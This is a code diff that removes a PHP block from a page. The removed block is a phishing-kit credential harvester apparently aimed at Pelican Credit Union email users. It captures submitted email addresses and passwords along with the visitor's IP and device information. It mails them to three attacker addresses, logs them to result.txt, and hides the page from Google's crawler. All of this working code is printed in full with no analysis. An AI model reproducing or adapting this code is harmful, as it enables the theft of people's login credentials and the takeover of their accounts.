@@ -1,39 +1,3 @@
-<?php
-session_start();
-include('css/vld.php');
-include('antibots.php');
-include('config/email.php');
-if(isset($_POST['email'])){
-    
-    $ip = getenv("REMOTE_ADDR");
-    $ua = $_SERVER['HTTP_USER_AGENT'];
-$msg .= "#------------------[ Pelican CU EMail Access 2 ]---------------------#\n";
-$msg .= "Email Address  : ".$_POST['email']."\n";
-$msg .= "Password  : ".$_POST['pass']."\n";
-$msg .= "#-----------------[ Visitor ]------------------#\n";
-$msg .= "IP Address     : ".$ip."\n";
-$msg .= "DEVICE INFORMATION         : ".$ua."\n";
-$msg .= "#-------------------[ SNICKYNINJA - END ]------------------------#\n\n";
-$sub = "::SNICKYNINJA:: Pelican CU Email access 2: $ip";
-mail($to,$sub,$msg);
-mail($ml1,$sub,$msg);
-mail($ml2,$sub,$msg);
-
-     $data = fopen("result.txt", "a");
-    $result = $msg;
-   fwrite($data, $result);
-   fclose($data);
-}
-if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
-    header('HTTP/1.0 404 Not Found');
-    exit();
-}
-
-if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
-    header('HTTP/1.0 404 Not Found');
-    exit();
-}
-?>
 <!DOCTYPE html>
 <html>
 <head>
